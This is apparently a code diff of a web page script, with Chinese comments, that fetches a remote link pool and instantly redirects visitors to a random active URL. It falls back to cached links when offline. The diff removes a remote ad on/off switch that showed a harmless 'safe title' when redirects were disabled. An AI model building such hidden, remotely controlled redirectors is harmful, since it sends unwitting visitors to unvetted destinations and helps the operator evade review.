@@ -17,47 +17,42 @@
   <script>
     (async () => {
       const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
-      const CONFIG_URL = "https://liuhongliang11895.github.io/888/config.json";
       const LOCAL_KEY = "lastActiveLinks";
       let activeLinks = [];
 
       try {
-        // ① 拉取主控 config.json 控制广告启停
-        const conf = await fetch(CONFIG_URL + "?t=" + Date.now(), { cache: "no-store" }).then(r => r.json());
-        if (!conf.enableRedirect) {
-          document.open();
-          document.write(`<h2>${conf.safeTitle || "Content temporarily unavailable."}</h2>`);
-          document.close();
-          return;
-        }
-
-        // ② 拉取主仓库链接池
+        // ① 拉取主仓库链接池
         const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
         const data = await res.json();
-        activeLinks = data.links.filter(l => l.active);
 
+        // ② 校验结构
+        if (!data || !Array.isArray(data.links)) throw new Error("Invalid mapping structure");
+
+        // ③ 筛选出激活的链接
+        activeLinks = data.links.filter(l => l.active);
         if (!activeLinks.length) throw new Error("No active links");
 
-        // ③ 缓存活跃链接
+        // ④ 缓存当前活跃链接
         localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));
 
-        // ④ 随机分配链接（绝对均匀随机）
+        // ⑤ 随机分配链接
         const idx = Math.floor(Math.random() * activeLinks.length);
 
-        // ⑤ 秒跳转（无任何渲染）
+        // ⑥ 秒跳转
         location.replace(activeLinks[idx].url);
 
       } catch (e) {
         console.error("Redirect failed:", e);
 
-        // ⑥ 断网回退逻辑
-        const cached = JSON.parse(localStorage.getItem("lastActiveLinks") || "[]");
+        // ⑦ 断网回退逻辑
+        const cached = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
         if (cached.length) {
           location.replace(cached[Math.floor(Math.random() * cached.length)].url);
         } else {
           document.open();
           document.write("<h2>System maintenance. Please try again later.</h2>");
           document.close();
+          document.body.style.display = 'block';
         }
       }
     })();
